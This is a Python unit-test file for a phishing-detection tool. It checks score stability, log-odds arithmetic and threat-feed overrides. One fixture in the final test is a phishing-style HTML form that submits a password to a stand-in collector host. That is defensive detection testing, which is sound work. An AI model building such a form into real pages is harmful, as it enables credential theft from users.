"""Security regression tests: no layout shortcuts and auditable score arithmetic."""
import math
import unittest
from unittest.mock import patch

from phishguard import content, intel
from phishguard.brands import BRANDS
from phishguard.predictor import PhishGuard

MINIMAL = '<html><meta name="viewport" content="width=device-width"><body><img src="logo.png"><label>Email <input type="email"></label><button>Sign in</button></body></html>'
RICH = '<html><head><title>Portal</title></head><body><p>Copyright ©</p>' + '<a href="/home">Home</a><img src="logo.png">' * 80 + '</body></html>'


class ScoringPolicyTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.guard = PhishGuard()
        cls.preview_patch = patch.object(content, 'render_static_preview', return_value=None)
        cls.preview_patch.start()
        cls.addClassCleanup(cls.preview_patch.stop)

    def assess_html(self, url, html, osint=None):
        page = {'html': html, 'final_url': url, 'status': 200, 'content_type': 'text/html'}
        osint = osint or {'whois': {'status': 'not_found'}, 'dns': {'status': 'ok', 'resolves': True}, 'tls': {'status': 'ok', 'valid': True}, 'threat_intel': []}
        with patch.object(content, 'safe_fetch', return_value=page), patch.object(intel, 'enrich', return_value=osint):
            return self.guard.assess(url)

    def test_missing_navigation_and_page_decorations_do_not_change_model_estimate(self):
        for url in ('https://portal.example.edu/login/', 'https://campus.university.org/login/', 'https://maheslcm.manipal.edu/login/'):
            minimal = self.assess_html(url, MINIMAL)
            rich = self.assess_html(url, RICH)
            self.assertEqual(minimal['ml_probability'], rich['ml_probability'], url)
            self.assertEqual(minimal['final_score'], rich['final_score'], url)
            self.assertEqual(minimal['page']['inspection_status'], 'inspected')
            self.assertNotIn('NoOfSelfRef', [e['feature'] for e in minimal['explanation']])

    def test_portal_regression_without_site_override(self):
        self.assertNotIn('manipal', BRANDS)
        result = self.assess_html('https://maheslcm.manipal.edu/login/', MINIMAL)
        self.assertEqual(result['verdict'], 'LEGITIMATE')
        self.assertNotIn('full', result['model_used'])
        self.assertEqual(result['page']['content_features']['NoOfSelfRef'], 0)

    def test_unknown_registration_age_is_neutral(self):
        result = self.assess_html('https://example.com/', MINIMAL)
        missing = next(s for s in result['signals'] if s['name'] == 'no_whois_record')
        self.assertEqual(missing['change_pp'], 0)
        self.assertEqual(result['ml_probability'], result['final_score'])

    def test_rule_changes_sum_to_final_score_and_follow_log_odds(self):
        osint = {'whois': {'status': 'ok', 'age_days': 3}, 'dns': {'status': 'ok', 'resolves': True}, 'tls': {'status': 'ok', 'valid': False, 'error': 'expired'}, 'threat_intel': []}
        result = self.assess_html('https://example.com/', MINIMAL, osint)
        b = result['score_breakdown']
        changes = sum(s['change_pp'] for s in b['steps'][1:-1])
        self.assertAlmostEqual(b['model_score'] * 100 + changes, b['final_score'] * 100, places=8)
        expected = 1 / (1 + math.exp(-(math.log(b['model_score'] / (1-b['model_score'])) + 1.2 + .8)))
        self.assertAlmostEqual(b['final_score'], expected)

    def test_threat_override_is_explicit_in_additive_breakdown(self):
        osint = {'whois': {'status': 'not_found'}, 'dns': {'status': 'ok'}, 'tls': {'status': 'ok', 'valid': True}, 'threat_intel': [{'source': 'Test feed', 'status': 'listed'}]}
        result = self.assess_html('https://example.com/', MINIMAL, osint)
        b = result['score_breakdown']
        self.assertEqual(result['verdict'], 'PHISHING')
        self.assertTrue(any(s['label'] == 'Threat-feed override' for s in b['steps']))
        self.assertAlmostEqual(b['model_score'] + sum(s['change_pp'] for s in b['steps']) / 100, .99)

    def test_external_password_submission_still_increases_risk(self):
        html = '<html><form action="https://collector.invalid/steal"><input type="password"></form></html>'
        result = self.assess_html('https://example.com/', html)
        self.assertIn('external_form_submit_password', [s['name'] for s in result['signals']])
        self.assertGreater(result['final_score'], result['ml_probability'])


if __name__ == '__main__':
    unittest.main()
